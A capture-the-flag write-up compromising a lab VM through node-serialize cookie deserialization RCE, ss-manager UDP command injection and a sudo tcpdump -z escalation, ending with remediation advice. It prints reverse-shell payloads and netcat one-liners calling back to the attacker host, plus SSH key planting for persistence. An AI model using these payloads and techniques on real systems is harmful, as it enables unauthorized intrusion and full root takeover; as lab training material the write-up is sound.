# Temple of Doom — Boot2Root Writeup

**Category:** Web Application Exploitation → Remote Code Execution → Privilege Escalation
**Platform:** VulnHub-style boot2root VM
**Attacker:** Kali Linux (`192.168.56.101`)
**Target:** `192.168.56.108`

> Full attack chain from initial recon to root, exploiting an insecure Node.js
> deserialization vulnerability for RCE, followed by two privilege escalation
> steps to reach root.

---

## Summary

| | |
|---|---|
| **Initial access** | Node.js `unserialize()` deserialization → RCE (as `nodeadmin`) |
| **Privilege escalation #1** | `ss-manager` running as `fireman`, exploited via UDP config injection |
| **Privilege escalation #2** | Misconfigured `sudo` rule on `tcpdump` → root |
| **Impact** | Full remote root compromise |

---

## 1. Recon — Host Discovery & Port Scan

Discovered live hosts on the local subnet and enumerated all 65535 TCP ports on the target.

```bash
nmap -sn 192.168.56.101/24
nmap -p- -Pn -n 192.168.56.108
```

Two ports open: `22/tcp (ssh)` and `666/tcp (doom)`.

![nmap discovery and port scan](images/01-nmap-discovery-portscan.png)

## 2. Enumeration — Service Version Detection

```bash
nmap -p 22,666 -Pn -n -A 192.168.56.108
```

Port 666 is running a **Node.js Express** application — confirms the attack surface is a
custom web app rather than a known CVE'd service.

![nmap service version detection](images/02-nmap-service-version-detection.png)

## 3. Web Application Recon

First visit to `http://192.168.56.108:666` shows only *"Under Construction, Come Back Later!"*

![web app first visit](images/03-web-app-first-visit.png)

Refreshing the page throws an unhandled **`SyntaxError`** stack trace that leaks server-side
implementation detail: `Object.exports.unserialize` from the `node-serialize` module is being
called directly on a value taken from the request — a classic sign of **insecure deserialization**.

![error stacktrace leaking node-serialize](images/04-error-stacktrace-unserialize.png)

## 4. Vulnerability Analysis — Insecure Deserialization (RCE)

Intercepting the request in Burp Suite shows a `profile` cookie containing a base64-encoded
value that gets deserialized server-side.

![burp cookie capture](images/05-burp-cookie-capture.png)

Decoding the cookie in Burp's Decoder reveals broken JSON — the `Expires` value is missing
quotes, which is what triggers the parser error:

```json
{"username":"Admin","csrftoken":"...","Expires=":Friday...}
```

![burp decoder broken json](images/06-burp-decoder-broken-json.png)

Fixing the JSON syntax and re-encoding it to base64 produces a valid cookie:

![burp decoder fixed cookie](images/07-burp-decoder-fixed-cookie.png)

Sending the corrected cookie returns `200 OK` and `"Hello Admin"`, confirming the application
accepts and deserializes attacker-controlled JSON:

![fixed cookie 200 ok](images/08-fixed-cookie-200-ok.png)
![hello admin in browser](images/09-hello-admin-browser.png)

**Why this matters:** the `node-serialize` package deserializes JS function expressions
embedded in the payload and executes them. Any object with a `username` field shaped like
`"_$$ND_FUNC$$_function(){...}()"` gets evaluated server-side — this is a direct path to
remote code execution.

## 5. Exploitation — Weaponizing the Deserialization Bug

Used a known Node.js reverse-shell payload generator to build an ASCII-encoded reverse shell:

```bash
python2 nodejsshell.py 192.168.56.101 4444
```

![nodejsshell.py script](images/10-nodejsshell-script.png)
![payload generated](images/11-payload-generated.png)

The generated payload is wrapped in the deserialization format and base64-encoded in Burp
Decoder, ready to be dropped in as the cookie value:

```
{"username":"_$$ND_FUNC$$_function (){(eval(...))}()"}
```

![payload encoded in burp decoder](images/12-payload-encoded-burp-decoder.png)

Sent via Burp Proxy Intercept:

![payload sent via burp proxy](images/13-payload-sent-burp-proxy.png)

An alternate `mkfifo`-based payload was also prepared as a backup reverse-shell method:

![mkfifo payload encoded](images/14-mkfifo-payload-encoded.png)
![request sent waiting for shell](images/15-request-sent-waiting.png)

## 6. Foothold — Shell as `nodeadmin`

A netcat listener catches the callback:

```bash
nc -lvnp 4444
```

![shell received as nodeadmin](images/16-shell-received-nodeadmin.png)

Basic enumeration of the landing directory:

```bash
whoami; ls; pwd; ls -la
```

Reveals `.ssh`, `.web`, `.forever`, and `.config` directories under `/home/nodeadmin`.

![enumeration as nodeadmin](images/17-enumeration-nodeadmin.png)

## 7. Establishing Persistence

Generated an RSA key pair on Kali and planted the public key on the target for stable,
passwordless SSH access — far more reliable than a raw reverse shell for continued enumeration.

```bash
ssh-keygen -t rsa
cat /home/sana/.ssh/id_rsa.pub
```

![ssh keygen on kali](images/18-ssh-keygen-kali.png)

Explored the Node.js application source to confirm the vulnerable dependency:

```bash
cd .web && ls -R
```

Confirms `node_modules/node-serialize` is present — matching the RCE identified earlier.

![nodejs app directory explored](images/19-nodejs-app-directory.png)

Planted the key via the reverse shell:

```bash
echo "ssh-rsa AAAA...sana@kali" >> /home/nodeadmin/.ssh/authorized_keys
```

![ssh key planted on nodeadmin](images/20-ssh-key-planted-nodeadmin.png)
![ssh key added via shell](images/21-ssh-key-added-via-shell.png)

Stable access confirmed:

```bash
ssh nodeadmin@192.168.56.108
```

![ssh access confirmed as nodeadmin](images/22-ssh-access-confirmed-nodeadmin.png)

## 8. Privilege Escalation #1 — `nodeadmin` → `fireman`

Process enumeration reveals `ss-manager` running as user **`fireman`**:

```bash
ps aux | grep ss-manager
```

`ss-manager` (shadowsocks) listens on a local UDP management port and accepts JSON config
commands — including a `plugin`/`method` field that gets passed to a shell. Sent a crafted
`add` command over UDP that smuggles a reverse shell command into the `method` field:

```bash
nc -u 127.0.0.1 8839
add: {"server_port":8003, "password":"test", "method":"||nc -e /bin/bash 192.168.56.101 444||"}
```

![ss-manager fireman exploit sent](images/23-ss-manager-fireman-exploit-sent.png)

Caught the shell as `fireman` and planted an SSH key the same way as before for stable access:

```bash
nc -lvnp 444
echo "ssh-rsa AAAA...sana@kali" >> /home/fireman/.ssh/authorized_keys
chmod 700 /home/fireman/.ssh
chmod 600 /home/fireman/.ssh/authorized_keys
```

![fireman shell caught ssh key planted](images/24-fireman-shell-ssh-key-planted.png)

## 9. Privilege Escalation #2 — `fireman` → `root`

With stable SSH access as `fireman`, checked sudo permissions:

```bash
ssh fireman@192.168.56.108
sudo -l
```

`fireman` can run `tcpdump`, `iptables`, and `nmcli` as root **without a password**.
Modern `tcpdump` supports the `-z` (postrotate-command) flag, which lets an unprivileged
sudoer execute an arbitrary program **as root** once tcpdump rotates its capture file —
a well-known GTFOBins-style privilege escalation vector.

```bash
echo 'nc -e /bin/bash 192.168.56.101 5555' > /tmp/exp
chmod +x /tmp/exp
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exp -Z root
```

![fireman sudo -l tcpdump exploit](images/25-fireman-sudo-l-tcpdump-exploit.png)

## 10. Root — Full Compromise

Netcat catches the root shell. `whoami` confirms **root**, and filesystem enumeration
confirms full system access:

```bash
whoami   # root
pwd      # /home/fireman
cd .. ; ls
cd / ; ls
```

![root shell and filesystem enumeration](images/26-root-shell-fs-enumeration.png)

## 11. Flag

```bash
cd root
ls
cat flag.txt
```

```
FLAG: kre0cu4jl4rzjicpo1i7z5l1
```

![flag captured](images/27-flag-captured-ascii-art.png)
![flag value](images/28-flag-captured-value.png)

---

## Root Cause & Remediation

| Issue | Fix |
|---|---|
| `node-serialize` used to parse untrusted cookie data | Never deserialize attacker-controlled input with `eval`-based serializers; use `JSON.parse` and validate schema instead |
| `ss-manager` accepting unauthenticated UDP config commands | Bind management interfaces to localhost only, require authentication, and never pass user input into a shell/exec call |
| Passwordless `sudo` on `tcpdump` | Never grant `sudo` on binaries with post-rotate/exec hooks (`tcpdump -z`, etc.) without restricting arguments; prefer targeted `sudoers` entries with fixed arguments only |

## Tools Used

`nmap` · Burp Suite (Proxy, Repeater, Decoder) · Metasploit-style manual exploitation · `netcat` · `ssh-keygen` · custom Node.js reverse-shell generator
